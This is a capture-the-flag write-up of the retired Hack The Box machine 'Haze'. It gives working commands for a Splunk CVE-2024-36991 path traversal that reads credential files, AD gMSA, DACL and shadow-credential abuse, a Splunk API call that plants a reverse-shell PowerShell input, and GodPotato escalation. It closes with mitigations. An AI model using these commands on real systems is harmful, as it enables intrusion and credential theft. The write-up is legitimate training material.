---
machine: Haze
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, active-directory, splunk, cve-2024-36991, gmsa, shadow-credentials]
---

# Haze — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Splunk Enterprise 9.2.1 allows file reads through CVE-2024-36991. `splunk.secret` and the LDAP configuration are retrieved, `paul.taylor`'s password is decrypted and users are enumerated over SAMR. A gMSA, `WriteOwner`, `WriteMembers` and shadow credentials chain reaches `edward.martin`; a Splunk backup and the PowerShell modular input lead to SYSTEM with GodPotato.

## Reconnaissance

```bash
nmap -Pn -sC -sV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8000,8088,8089,9389 <IP>
```

- `haze.htb` DC with AD ports.
- Splunk Web on 8000, HEC on 8088 and management on 8089.
- Splunkd advertises version 9.2.1.

## Enumeration

- The version predates 9.2.2/9.1.5, which fix CVE-2024-36991.
- The Windows `os.path.join` traversal reads files relative to `$SPLUNK_HOME`.

```bash
curl -s 'http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/system/local/authentication.conf'
curl -s 'http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/auth/splunk.secret'
```

## Foothold

`authentication.conf` contains the `bindDN` and a `$7$` blob; `splunk.secret` is the master key. `splunksecrets splunk-decrypt` recovers `paul.taylor`'s LDAP password.

```bash
splunksecrets splunk-decrypt -S splunk.secret '<BLOB>'
nxc smb dc01.haze.htb -u paul.taylor -p '<PASSWORD>' --rid-brute 5000
```

SAMR enumeration reveals `mark.adams`, `edward.martin`, `alexander.green`, the `Haze-IT-Backup$` gMSA and groups such as `gMSA_Managers` and `Support_Services`.

## Lateral movement

`mark.adams` is in `gMSA_Managers` and can modify the gMSA's `msDS-GroupMSAMembership`. He authorises himself to read it and obtains its NTLM hash.

```powershell
Set-ADServiceAccount -Identity 'Haze-IT-Backup$' -PrincipalsAllowedToRetrieveManagedPassword mark.adams
```

The gMSA has `WriteOwner` over `Support_Services`. Ownership is changed, `WriteMembers` is granted, and the gMSA adds itself to the group. That group has `AddKeyCredentialLink` over `edward.martin`; `certipy-ad shadow auto` obtains his hash.

```bash
impacket-owneredit -target support_services -new-owner 'HAZE-IT-BACKUP$' -action write
impacket-dacledit -action write -rights WriteMembers -principal 'HAZE-IT-BACKUP$' -target-dn 'CN=Support_Services,CN=Users,DC=Haze,DC=htb'
certipy-ad shadow auto -username 'HAZE-IT-BACKUP$@haze.htb' -hashes :<NTLM> -account edward.martin
```

## Privilege escalation

`edward.martin` is in `Backup_Reviewers` and can read a Splunk backup. The configuration contains a legacy secret and the password of `alexander.green`, the Splunk administrator. API access creates a `powershell` modular input that runs a reverse shell as the service account.

```bash
splunksecrets splunk-legacy-decrypt -S backup/etc/auth/splunk.secret '<BLOB>'
curl -sk -u 'admin:<PASSWORD>' -X POST \
  'https://haze.htb:8089/servicesNS/nobody/search/data/inputs/powershell' \
  --data-urlencode 'name=evil' --data-urlencode 'script=<PS_REVSHELL>' \
  --data-urlencode 'schedule=0/30 * * * * ?' --data-urlencode 'index=main'
```

The resulting shell has `SeImpersonatePrivilege`; GodPotato elevates it to `NT AUTHORITY\SYSTEM`.

## Evidence

- `authentication.conf` and `splunk.secret` reads.
- Decrypted LDAP password, redacted.
- SAMR enumeration and gMSA/DACL chain.
- Shadow credentials and WinRM as `edward.martin`.
- PowerShell input and `whoami` as SYSTEM.
- Redacted flag.

## Lessons learned

- An application secret can decrypt another service's credentials.
- `WriteOwner` on a group allows rebuilding membership without being an administrator.
- Splunk backups contain old secrets that may still be valid.

## Mitigations and detection

- Update Splunk to 9.2.2, 9.1.5 or 9.0.10.
- Rotate secrets and LDAP credentials; do not reuse them in backups.
- Audit changes to `msDS-GroupMSAMembership`, group owners and `msDS-KeyCredentialLink`.
- Restrict modular inputs and monitor creation of `powershell` inputs.

## References

- <https://www.hackthebox.com/machines/Haze>
- <https://nvd.nist.gov/vuln/detail/CVE-2024-36991>
- <https://adsecurity.org/?p=2011>
- <https://attack.mitre.org/techniques/T1558/003/>
